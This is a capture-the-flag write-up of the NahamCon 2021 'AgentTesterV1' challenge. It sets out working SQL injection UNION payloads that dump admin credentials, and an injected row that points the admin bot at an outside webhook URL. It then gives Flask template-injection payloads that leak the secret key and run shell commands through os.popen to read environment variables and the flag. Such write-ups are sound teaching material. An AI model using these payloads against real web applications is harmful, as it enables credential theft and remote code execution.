---
title: AgentTesterV1
description: AgentTesterV1 Nahamcon 2021 challenge write up.
---

# AgentTesterV1 <a href='/assets/resources/CTFs/Nahamcon_2021/AgentTesterV1-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

The code of the aplication was provided and looking at the code we can see that is vulnerable to sql injection (Later i discovered that this wasnt really necessary because the tables names can be checked in the aplication files but hey, is cool):

`SELECT userAgent, url FROM uAgents WHERE userAgent = '%s'`


Lets get the tables names:
`' UNION SELECT name, name FROM sqlite_master WHERE type='table' --`
`' UNION SELECT name, name FROM sqlite_master WHERE type='table' and name!="uAgents"--`

Table names:
- uAgents
- user

The user table is what we want here i guess. Lets try this:

`' UNION SELECT username, password FROM user --`

And the page gave us: `Testing User-Agent: admin in url: *)(@skdnaj238374834**__**=` cool! So we now have the admin credentials:

```
admin:*)(@skdnaj238374834**__**=
```

Also we can use whatever endpoint and user agent we want:

`' UNION SELECT 'AgentTester v1','https://hookb.in/oXYJDgO6yzS1mmLaRZax' --`


Next, i noticed that the endpoint `/debug` exists (The challenge provided the code but im silly and didnt take a look until now). Looking at the app code, i noticed that it ask for a specific session ID, probably the admin user. I got the admin user so was not too hard to get access to it using Postman (Just copied the header `Cookie` from my browser to Postman). 

After some research, looks like we can inject flask under the key `code` with a POST form to the `/debug` endpoint. For example:

```
code:{{config}}

<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '1L5&wnIh4!Rz6Ufo^iY?aRyV2qXM+kz5', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'auth', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///DB/db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
```

Funny. What about this:

```
code:{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

uid=1000(uwsgi) gid=0(root) groups=0(root)
```

So we have remote code execution. After some digging i found the flag listing all the envars of the machine:

```
code:{{request.application.__globals__.__builtins__.__import__('os').popen('printenv').read()}}

BASE_URL=challenge.nahamcon.com KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.116.0.1:443 UWSGI_ORIGINAL_PROC_NAME=uwsgi HOSTNAME=agenttester-691977e06298952e-5c9d4d6f8f-ssqhz SHLVL=1 PYTHON_PIP_VERSION=21.0.1 PORT= HOME=/root GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 _=/usr/local/bin/uwsgi PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/b60e2320d9e8d02348525bd74e871e466afdf77c/get-pip.py KUBERNETES_PORT_443_TCP_ADDR=10.116.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 CHALLENGE_FLAG=flag{fb4a87cfa85cf8c5ab2effedb4ea7006} PYTHON_VERSION=3.8.8 ADMIN_BOT_PASSWORD=*)(@skdnaj238374834**__**= KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.116.0.1:443 CHALLENGE_NAME=AgentTester PWD=/app ADMIN_BOT_USER=admin KUBERNETES_SERVICE_HOST=10.116.0.1 PYTHON_GET_PIP_SHA256=c3b81e5d06371e135fb3156dc7d8fd6270735088428c4a9a5ec1f342e2024565 UWSGI_RELOADS=0
```

Flag: `flag{fb4a87cfa85cf8c5ab2effedb4ea7006}`
